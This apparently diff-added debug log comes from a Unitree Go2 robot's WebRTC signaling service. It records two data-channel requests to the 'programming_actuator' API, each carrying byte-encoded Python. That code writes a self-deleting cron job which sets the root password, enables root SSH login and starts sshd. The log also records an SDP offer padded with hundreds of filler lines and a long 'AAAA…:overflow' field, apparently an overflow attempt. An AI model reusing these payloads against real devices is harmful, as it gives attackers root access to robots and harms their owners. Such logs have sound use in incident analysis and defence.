+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:234]: webrtcConnectionAnswer() coming_topic = rt/webrtcreq, use webrtc_res_writer
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:15]: do_webrtc_req_take() trigger
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:66]: connection state change to [RTC_PEER_CONNECTION_STATE_CONNECTED]
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:249]: logSelectedIceCandidatesInformation() sessionOnTurnServer set to 0
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:535]: onSctpSessionDataChannelOpen() enter
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1475]: tryToIdentifyInterface() enter
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1490]: tryToIdentifyInterface() addr=560725673
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1491]: tryToIdentifyInterface() port=18840
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1508]: tryToIdentifyInterface() found target interface, interface_NAME=eth0
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2261]: [PUBNET] dataChannelOnOpenCallback() rtc_peer_conn->interface_NAME=eth0 
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2271]: [PUBNET] dataChannelOnOpenCallback() pConfiguration->publicNetworkStatus set to Undefined
+rm: cannot remove '/tmp/*pcap': No such file or directory
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2194]: [PUBNET] doInterfacePacketStatisticsThreadFunction enter
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2194]: [PUBNET] doInterfacePacketStatisticsThreadFunction enter
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2295]: [PUBNET] do pthread join check
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2295]: [PUBNET] do pthread join check
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2295]: [PUBNET] do pthread join check
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:140]: dataChannelOnMessageCallback() incoming message = {"type":"req","topic":"rt/api/programming_actuator/request","data":{"header":{"identity":{"id":72129369,"api_id":1002}},"parameter":"{\"program_content\": {\"chunk_index\": 1, \"total_chunk_num\": 1, \"chunk_content\": \"_p = str(bytes([47, 101, 116, 99, 47, 99, 114, 111, 110, 46, 100, 47, 117, 115, 104]), 'utf-8')\\n_e = str(bytes([42, 32, 42, 32, 42, 32, 42, 32, 42, 32, 114, 111, 111, 116, 32, 101, 99, 104, 111, 32, 39, 114, 111, 111, 116, 58, 117, 110, 108, 101, 97, 115, 104, 39, 32, 124, 32, 99, 104, 112, 97, 115, 115, 119, 100, 32, 38, 38, 32, 115, 101, 100, 32, 45, 105, 32, 39, 115, 47, 94, 35, 42, 80, 101, 114, 109, 105, 116, 82, 111, 111, 116, 76, 111, 103, 105, 110, 46, 42, 47, 80, 101, 114, 109, 105, 116, 82, 111, 111, 116, 76, 111, 103, 105, 110, 32, 121, 101, 115, 47, 39, 32, 47, 101, 116, 99, 47, 115, 115, 104, 47, 115, 115, 104, 100, 95, 99, 111, 110, 102, 105, 103, 32, 38, 38, 32, 115, 121, 115, 116, 101, 109, 99, 116, 108, 32, 101, 110, 97, 98, 108, 101, 32, 115, 115, 104, 32, 38, 38, 32, 115, 121, 115, 116, 101, 109, 99, 116, 108, 32, 115, 116, 97, 114, 116, 32, 115, 115, 104, 32, 38, 38, 32, 114, 109, 32, 45, 102, 32, 47, 101, 116, 99, 47, 99, 114, 111, 110, 46, 100, 47, 117, 115, 104]), 'utf-8')\\n_d = np.array([_e])\\nnp.savetxt(_p, _d, fmt='%s')\"}, \"program_uuid\": \"1780336069\", \"bind_hotkey\": \"L1+Y\"}"}}
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:148]: dataChannelOnMessageCallback() incoming topic = rt/api/programming_actuator/request
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:185]: dataChannelOnMessageCallback() request ident id=72129369
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher/request.h:46]: write_request() req.header.policy.priority=0, req.header.policy.noreply=0 
+tcpdump: listening on wlan0, link-type EN10MB (Ethernet), capture size 262144 bytes
+tcpdump: wwan0: No such device exists
+(SIOCGIFHWADDR: No such device)
+tcpdump: /tmp/wwan0_1715917190_captrue.pcap: No such file or directory
+[2024-05-17 11:39:50 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2241]: [PUBNET] Interface:wwan0, Number of lines: 0
+0 packets captured
+0 packets received by filter
+0 packets dropped by kernel
+reading from file /tmp/wlan0_1715917190_captrue.pcap, link-type EN10MB (Ethernet)
+[2024-05-17 11:39:53 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2241]: [PUBNET] Interface:wlan0, Number of lines: 0
+[2024-05-17 11:40:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:40:20 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:75]: connection state change to [RTC_PEER_CONNECTION_STATE_CLOSED]
+[2024-05-17 11:40:20 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:195]: !!! OnSessionClosed() pConfiguration->streamingSessionCount=1
+[2024-05-17 11:40:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:40:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:41:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:41:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:41:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:42:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:42:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:42:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:43:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:43:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:15]: do_webrtc_req_take() trigger
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1768]: offerReceived() receive offer, offer_len is 5234
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1769]: offerReceived() receive offer, offer_content is {"sdp":"v=0\r\no=- 3456789012 1 IN IP4 0.0.0.0\r\ns=-\r\nt=0 0\r\na=fingerprint:sha-256 4A:AD:B9:B1:3C:82:CB:D4:8D:4F:40:58:5C:C8:49:71:19:F4:B6:B1:34:71:22:B5:36:9B:8F:D2:3E:AA:33:53\r\na=group:BUNDLE 0 1 2 3 4\r\nm=fingerprint\r\ni=sha-256 41:14:8F:BC:03:98:19:34:71:7E:F9:5D:7F:F7:74:77:8F:0D:00:9B:AE:2B:94:46:BC:5C:42:BB:C7:5A:4A:27\r\nc=IN IP4 0.0.0.0\r\na=ice-ufrag:uqAb\r\na=ice-pwd:phZeG6BNHGTk0mwABUXmLF\r\na=setup:actpass\r\na=mid:0\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\na=ice-ufrag:uqAb\r\na=ice-pwd:phZeG6BNHGTk0mwABUXmLF\r\na=mid:1\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\na=ice-ufrag:uqAb\r\na=ice-pwd:phZeG6BNHGTk0mwABUXmLF\r\na=mid:2\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\na=ice-ufrag:uqAb\r\na=ice-pwd:phZeG6BNHGTk0mwABUXmLF\r\na=mid:3\r\nm=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\na=ice-ufrag:uqAb\r\na=ice-pwd:phZeG6BNHGTk0mwABUXmLF\r\na=mid:4\r\na=candidate:b06876595f855fe0ce5212e1b302209c 1 udp 2130706431 192.168.1.233 52472 typ host\r\r\na=candidate:f5a9be8b49d027a84cd23cab8db3a9af 1 udp 2130706431 100.64.113.47 51449 typ host\r\r\na=candidate:edeb15bd8d3f0dbec18897b0ffdb6515 1 udp 2130706431 192.168.123.100 60180 typ host\r\r\na=pad000:x\r\na=pad001:x\r\na=pad002:x\r\na=pad003:x\r\na=pad004:x\r\na=pad005:x\r\na=pad006:x\r\na=pad007:x\r\na=pad008:x\r\na=pad009:x\r\na=pad010:x\r\na=pad011:x\r\na=pad012:x\r\na=pad013:x\r\na=pad014:x\r\na=pad015:x\r\na=pad016:x\r\na=pad017:x\r\na=pad018:x\r\na=pad019:x\r\na=pad020:x\r\na=pad021:x\r\na=pad022:x\r\na=pad023:x\r\na=pad024:x\r\na=pad025:x\r\na=pad026:x\r\na=pad027:x\r\na=pad028:x\r\na=pad029:x\r\na=pad030:x\r\na=pad031:x\r\na=pad032:x\r\na=pad033:x\r\na=pad034:x\r\na=pad035:x\r\na=pad036:x\r\na=pad037:x\r\na=pad038:x\r\na=pad039:x\r\na=pad040:x\r\na=pad041:x\r\na=pad042:x\r\na=pad043:x\r\na=pad044:x\r\na=pad045:x\r\na=pad046:x\r\na=pad047:x\r\na=pad048:x\r\na=pad049:x\r\na=pad050:x\r\na=pad051:x\r\na=pad052:x\r\na=pad053:x\r\na=pad054:x\r\na=pad055:x\r\na=pad056:x\r\na=pad057:x\r\na=pad058:x\r\na=pad059:x\r\na=pad060:x\r\na=pad061:x\r\na=pad062:x\r\na=pad063:x\r\na=pad064:x\r\na=pad065:x\r\na=pad066:x\r\na=pad067:x\r\na=pad068:x\r\na=pad069:x\r\na=pad070:x\r\na=pad071:x\r\na=pad072:x\r\na=pad073:x\r\na=pad074:x\r\na=pad075:x\r\na=pad076:x\r\na=pad077:x\r\na=pad078:x\r\na=pad079:x\r\na=pad080:x\r\na=pad081:x\r\na=pad082:x\r\na=pad083:x\r\na=pad084:x\r\na=pad085:x\r\na=pad086:x\r\na=pad087:x\r\na=pad088:x\r\na=pad089:x\r\na=pad090:x\r\na=pad091:x\r\na=pad092:x\r\na=pad093:x\r\na=pad094:x\r\na=pad095:x\r\na=pad096:x\r\na=pad097:x\r\na=pad098:x\r\na=pad099:x\r\na=pad100:x\r\na=pad101:x\r\na=pad102:x\r\na=pad103:x\r\na=pad104:x\r\na=pad105:x\r\na=pad106:x\r\na=pad107:x\r\na=pad108:x\r\na=pad109:x\r\na=pad110:x\r\na=pad111:x\r\na=pad112:x\r\na=pad113:x\r\na=pad114:x\r\na=pad115:x\r\na=pad116:x\r\na=pad117:x\r\na=pad118:x\r\na=pad119:x\r\na=pad120:x\r\na=pad121:x\r\na=pad122:x\r\na=pad123:x\r\na=pad124:x\r\na=pad125:x\r\na=pad126:x\r\na=pad127:x\r\na=pad128:x\r\na=pad129:x\r\na=pad130:x\r\na=pad131:x\r\na=pad132:x\r\na=pad133:x\r\na=pad134:x\r\na=pad135:x\r\na=pad136:x\r\na=pad137:x\r\na=pad138:x\r\na=pad139:x\r\na=pad140:x\r\na=pad141:x\r\na=pad142:x\r\na=pad143:x\r\na=pad144:x\r\na=pad145:x\r\na=pad146:x\r\na=pad147:x\r\na=pad148:x\r\na=pad149:x\r\na=pad150:x\r\na=pad151:x\r\na=pad152:x\r\na=pad153:x\r\na=pad154:x\r\na=pad155:x\r\na=pad156:x\r\na=pad157:x\r\na=pad158:x\r\na=pad159:x\r\na=pad160:x\r\na=pad161:x\r\na=pad162:x\r\na=pad163:x\r\na=pad164:x\r\na=pad165:x\r\na=pad166:x\r\na=pad167:x\r\na=pad168:x\r\na=pad169:x\r\na=pad170:x\r\na=pad171:x\r\na=pad172:x\r\na=pad173:x\r\na=pad174:x\r\na=pad175:x\r\na=pad176:x\r\na=pad177:x\r\na=pad178:x\r\na=pad179:x\r\na=pad180:x\r\na=pad181:x\r\na=pad182:x\r\na=pad183:x\r\na=pad184:x\r\na=pad185:x\r\na=pad186:x\r\na=pad187:x\r\na=pad188:x\r\na=pad189:x\r\na=pad190:x\r\na=pad191:x\r\na=pad192:x\r\na=pad193:x\r\na=pad194:x\r\na=pad195:x\r\na=pad196:x\r\na=pad197:x\r\na=pad198:x\r\na=pad199:x\r\na=pad200:x\r\na=pad201:x\r\na=pad202:x\r\na=pad203:x\r\na=pad204:x\r\na=pad205:x\r\na=pad206:x\r\na=pad207:x\r\na=pad208:x\r\na=pad209:x\r\na=pad210:x\r\na=pad211:x\r\na=pad212:x\r\na=pad213:x\r\na=pad214:x\r\na=pad215:x\r\na=pad216:x\r\na=pad217:x\r\na=pad218:x\r\na=pad219:x\r\na=pad220:x\r\na=pad221:x\r\na=pad222:x\r\na=pad223:x\r\na=pad224:x\r\na=pad225:x\r\na=pad226:x\r\na=pad227:x\r\na=pad228:x\r\na=pad229:x\r\na=pad230:x\r\na=pad231:x\r\na=pad232:x\r\na=pad233:x\r\na=pad234:x\r\na=pad235:x\r\na=pad236:x\r\na=pad237:x\r\na=pad238:x\r\na=pad239:x\r\na=pad240:x\r\na=pad241:x\r\na=pad242:x\r\na=pad243:x\r\na=pad244:x\r\na=pad245:x\r\na=pad246:x\r\na=pad247:x\r\na=pad248:x\r\na=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:overflow\r\n","id":"STA_localNetwork","type":"offer","token":""}
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:341]: hasConnectedSession() trigger
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1636]: isOfferContainTurnServer() offer not contain turnserver 
+
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1792]: offerReceived() offer not contain turnserver info!
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1795]: offerReceived() offer check passed!
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1808]: offerReceived() length: 5234
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1831]: offerReceived() check point 1
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1838]: offerReceived() check point 2
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1850]: offerReceived() before getTurnServerInfo!
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1852]: offerReceived() after getTurnServerInfo!
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:604]: createStreamingSession() enter
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:646]: createStreamingSession() CP 1
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:476]: initializePeerConnection() enter
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:477]: initializePeerConnection() CP 1
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:544]: initializePeerConnection() CP 2
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:558]: initializePeerConnection() CP 3
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:563]: initializePeerConnection() exit
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:654]: createStreamingSession() CP 2
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:668]: createStreamingSession() CP 3
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:682]: createStreamingSession() CP 4
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:710]: createStreamingSession() exit
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1855]: offerReceived() after createStreamingSession
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1858]: offerReceived() after getSignalSourceType
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1863]: offerReceived() after determineSessionNetworkMode
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1746]: getOfferToken() before cJSON_GetObjectItem token
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1752]: getOfferToken() after cJSON_GetObjectItem token
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1867]: offerReceived() after parse offer token
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1911]: offerReceived() exit
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:63]: connection state change to [RTC_PEER_CONNECTION_STATE_CONNECTING]
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:98]: [ICE] ICE checking (连通性检查)中, peer: client1715917407
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:437]: onIceCandidateHandler() enter
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:446]: [ICE] Gathering candidate: {"candidate":"candidate:1 1 udp 2130706431 169.254.107.33 33557 typ host raddr 0.0.0.0 rport 0 generation 0 network-cost 999","sdpMid":"0","sdpMLineIndex":0}
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:437]: onIceCandidateHandler() enter
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:446]: [ICE] Gathering candidate: {"candidate":"candidate:0 1 udp 2130706431 192.168.123.161 37997 typ host raddr 0.0.0.0 rport 0 generation 0 network-cost 999","sdpMid":"0","sdpMLineIndex":0}
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:437]: onIceCandidateHandler() enter
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:458]: [ICE] Candidate gathering finished for peer: client1715917407
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:211]: webrtcConnectionAnswer() trigger
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:234]: webrtcConnectionAnswer() coming_topic = rt/webrtcreq, use webrtc_res_writer
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:15]: do_webrtc_req_take() trigger
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:66]: connection state change to [RTC_PEER_CONNECTION_STATE_CONNECTED]
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:249]: logSelectedIceCandidatesInformation() sessionOnTurnServer set to 0
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:535]: onSctpSessionDataChannelOpen() enter
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1475]: tryToIdentifyInterface() enter
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1490]: tryToIdentifyInterface() addr=560725673
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1491]: tryToIdentifyInterface() port=5507
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1508]: tryToIdentifyInterface() found target interface, interface_NAME=eth0
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2261]: [PUBNET] dataChannelOnOpenCallback() rtc_peer_conn->interface_NAME=eth0 
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2271]: [PUBNET] dataChannelOnOpenCallback() pConfiguration->publicNetworkStatus set to Undefined
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2194]: [PUBNET] doInterfacePacketStatisticsThreadFunction enter
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2194]: [PUBNET] doInterfacePacketStatisticsThreadFunction enter
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2295]: [PUBNET] do pthread join check
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2295]: [PUBNET] do pthread join check
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2295]: [PUBNET] do pthread join check
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:140]: dataChannelOnMessageCallback() incoming message = {"type":"req","topic":"rt/api/programming_actuator/request","data":{"header":{"identity":{"id":72346630,"api_id":1002}},"parameter":"{\"program_content\": {\"chunk_index\": 1, \"total_chunk_num\": 1, \"chunk_content\": \"_p = str(bytes([47, 101, 116, 99, 47, 99, 114, 111, 110, 46, 100, 47, 117, 115, 104]), 'utf-8')\\n_e = str(bytes([42, 32, 42, 32, 42, 32, 42, 32, 42, 32, 114, 111, 111, 116, 32, 101, 99, 104, 111, 32, 39, 114, 111, 111, 116, 58, 117, 110, 108, 101, 97, 115, 104, 39, 32, 124, 32, 99, 104, 112, 97, 115, 115, 119, 100, 32, 38, 38, 32, 115, 101, 100, 32, 45, 105, 32, 39, 115, 47, 94, 35, 42, 80, 101, 114, 109, 105, 116, 82, 111, 111, 116, 76, 111, 103, 105, 110, 46, 42, 47, 80, 101, 114, 109, 105, 116, 82, 111, 111, 116, 76, 111, 103, 105, 110, 32, 121, 101, 115, 47, 39, 32, 47, 101, 116, 99, 47, 115, 115, 104, 47, 115, 115, 104, 100, 95, 99, 111, 110, 102, 105, 103, 32, 38, 38, 32, 115, 121, 115, 116, 101, 109, 99, 116, 108, 32, 101, 110, 97, 98, 108, 101, 32, 115, 115, 104, 32, 38, 38, 32, 115, 121, 115, 116, 101, 109, 99, 116, 108, 32, 115, 116, 97, 114, 116, 32, 115, 115, 104, 32, 38, 38, 32, 114, 109, 32, 45, 102, 32, 47, 101, 116, 99, 47, 99, 114, 111, 110, 46, 100, 47, 117, 115, 104]), 'utf-8')\\n_d = np.array([_e])\\nnp.savetxt(_p, _d, fmt='%s')\"}, \"program_uuid\": \"1780336286\", \"bind_hotkey\": \"L1+Y\"}"}}
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:148]: dataChannelOnMessageCallback() incoming topic = rt/api/programming_actuator/request
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:185]: dataChannelOnMessageCallback() request ident id=72346630
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher/request.h:46]: write_request() req.header.policy.priority=0, req.header.policy.noreply=0 
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber/response.h:78]: do_response_data_take() topic=rt/api/programming_actuator/response, sendOnDataChannel msg_len=152
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:75]: connection state change to [RTC_PEER_CONNECTION_STATE_CLOSED]
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:195]: !!! OnSessionClosed() pConfiguration->streamingSessionCount=1
+tcpdump: wwan0: No such device exists
+(SIOCGIFHWADDR: No such device)
+tcpdump: listening on wlan0, link-type EN10MB (Ethernet), capture size 262144 bytes
+tcpdump: /tmp/wwan0_1715917407_captrue.pcap: No such file or directory
+[2024-05-17 11:43:27 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2241]: [PUBNET] Interface:wwan0, Number of lines: 0
+0 packets captured
+0 packets received by filter
+0 packets dropped by kernel
+reading from file /tmp/wlan0_1715917407_captrue.pcap, link-type EN10MB (Ethernet)
+[2024-05-17 11:43:30 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2241]: [PUBNET] Interface:wlan0, Number of lines: 0
+[2024-05-17 11:43:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:44:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:44:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:44:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:45:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:45:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:45:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:46:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:46:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:46:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:47:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:47:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
